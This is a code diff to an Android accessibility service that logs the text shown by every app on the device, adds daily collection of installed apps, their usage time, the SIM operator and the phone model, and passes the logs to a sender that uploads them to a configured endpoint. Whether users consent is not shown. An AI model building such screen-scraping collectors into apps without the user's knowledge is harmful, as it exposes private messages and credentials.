@@ -2,16 +2,22 @@ package com.example.liveaction_int;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Environment;
 import android.os.StrictMode;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
@@ -39,14 +45,18 @@ import javax.net.ssl.HttpsURLConnection;
 
 public class Accessibilty_service extends AccessibilityService {
 String s2="";
+String dir="";
     String[] appslist = new String []{};
     ArrayList<String> appl = new ArrayList<String>();
     String must_dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath();
-    String dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath() + File.separator + "lifeaction";
+
 FileSender fs =new FileSender();
         Filewrite fw = new Filewrite();
 
+
+
     private static final String TAG = "MyAccessibilityService";
+    private ArrayList<String> installedApps;
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         ConnectivityManager conMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -55,17 +65,38 @@ FileSender fs =new FileSender();
         Intent batteryStatus = this.registerReceiver(null, ifilter);
         int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
         boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING;
-
+        final Calendar c = Calendar.getInstance();        // calender instance
         SharedPreferences sh = getSharedPreferences("MySharedPref", MODE_PRIVATE);
-         s2 = sh.getString("Userid", "");
+        s2 = sh.getString("Userid", "");
+        dir = sh.getString("dir","");
         String abt = sh.getString("endpt", "");
+////////////////
+        if (c.get(Calendar.HOUR_OF_DAY)==19){
+        installedApps = getInstalledApps();
+
+        String joinedString = String.join(" ", installedApps);
+
+        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+        String simOperatorName = telephonyManager.getSimOperatorName();
+        String brand  = Build.MANUFACTURER;
+        String gt = Build.MODEL;
+        String devicedata = "TELCOM\n"+simOperatorName+"PHONE_BRAND\n"+brand+gt+"\n"+joinedString;
+        fw.writedata(devicedata,c,dir,s2);
+        Log.e("instakll",devicedata);
+        }
+        ///////////////////////
+String event_str="";
+
 
         String data_str= "";
-        final Calendar c = Calendar.getInstance();     // calender instance
+        String event_end="";
+
         AccessibilityNodeInfo source = event.getSource();
         if (source != null) {
             AccessibilityNodeInfo rowNode = AccessibilityNodeInfo.obtain(source);
             int count = rowNode.getChildCount();
+            event_str = "~NewEvent:package_name^" +rowNode.getPackageName()  + "^data^";
+            fw.writeFile(event_str, s2,c,dir);
             for(int i=0; i<count ; i++){
                 AccessibilityNodeInfo completeNode = rowNode.getChild(i);
                 recur(completeNode, 1,event,c);
@@ -74,10 +105,63 @@ FileSender fs =new FileSender();
 //                 fw.writeFile(data_str, s2,c,dir);
 
             }
+            String str_ty = c.get(Calendar.YEAR) + "-" + String.valueOf(c.get(Calendar.MONTH) + 1) + "-" + c.get(Calendar.DATE) + ":" + c.get(Calendar.HOUR_OF_DAY) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND) + ":" + c.get(Calendar.MILLISECOND);
+
+            event_end="^event_time^"+str_ty;
+            fw.writeFile(event_end, s2,c,dir);
         }
 
         fs.sender(abt,must_dir,dir,c,isCharging,net,s2);
     }
+ /////////////////////////////////////////////
+    private ArrayList<String> getInstalledApps() {
+        PackageManager pm = getPackageManager();
+        ArrayList<String> apps = new ArrayList<String>();
+
+        List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
+
+        for (int i = 0; i < packs.size(); i++) {
+            PackageInfo p = packs.get(i);
+            if ((!isSystemPackage(p))) {
+                String packages = p.applicationInfo.packageName;
+                /////////////////
+
+
+
+                UsageStatsManager usageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
+
+
+                long currentTime = System.currentTimeMillis();
+
+                List<UsageStats> usageStatsList = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, currentTime - (24 * 60 * 60 * 1000), currentTime);
+
+
+                String packageName =  p.applicationInfo.packageName;
+                long foregroundTime = 0;
+                for (UsageStats usageStats : usageStatsList) {
+                    if (usageStats.getPackageName().equals(packageName)) {
+                        foregroundTime = usageStats.getTotalTimeInForeground();
+                        break;
+                    }
+                }
+
+                long foregroundTimeInMinutes = foregroundTime / 1000 / 60;
+                Log.e("tom and jerry","Foreground usage time for " + packageName + " in the last 24 hours: " + foregroundTimeInMinutes + " minutes");
+
+//
+                Log.e("packagenme",packages);
+                String pack_time= packages+"\n"+foregroundTimeInMinutes+"\n";
+                apps.add( pack_time);
+
+            }
+        }
+        return  apps;
+    }
+
+    private boolean isSystemPackage(PackageInfo pkgInfo) {
+        return (pkgInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
+    }
+        ///////////////////
     private void recur(AccessibilityNodeInfo completeNode, int step, AccessibilityEvent event, Calendar c) {
         if (completeNode!= null ) {
         int cout = completeNode.getChildCount();
@@ -89,9 +173,15 @@ FileSender fs =new FileSender();
 
 ////////////////////////////////////////////////////
                 /////data retriveing methods
-
+String text="";
                 String Text = String.valueOf(completeNode.getText());
                 String Content_Desc = String.valueOf(completeNode.getContentDescription());
+                if(Text!="null"){
+                    text = "^text:" + Text;
+                }
+                if(Content_Desc!="null"){
+                    text += "^text:" + Content_Desc;
+                }
                 if((Text!="null")||(Content_Desc!="null")) {
                 String str_ty = c.get(Calendar.YEAR) + "-" + String.valueOf(c.get(Calendar.MONTH) + 1) + "-" + c.get(Calendar.DATE) + ":" + c.get(Calendar.HOUR_OF_DAY) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND) + ":" + c.get(Calendar.MILLISECOND);
                 String Pack_name = String.valueOf(completeNode.getPackageName());
@@ -100,7 +190,8 @@ FileSender fs =new FileSender();
 
                 String Event_type = String.valueOf(event.getEventType());
 
-                Data_str = "~NewEvent:" + "event_info^" + Pack_name + "*" + Class_name + "*" + Event_type + "^text^" + Text + "^description^" + Content_Desc + "^event_time^" + str_ty;
+Data_str = text;
+//                Data_str = "~NewEvent:" + "event_info^" + Pack_name + "*" + Class_name + "*" + Event_type + "^text^" + Text + "^description^" + Content_Desc + "^event_time^" + str_ty;
                 Log.e("SINGLE ELEMENT ", Data_str);
                 fw.writeFile(Data_str, s2, c, dir);
 //                Data_str = "";
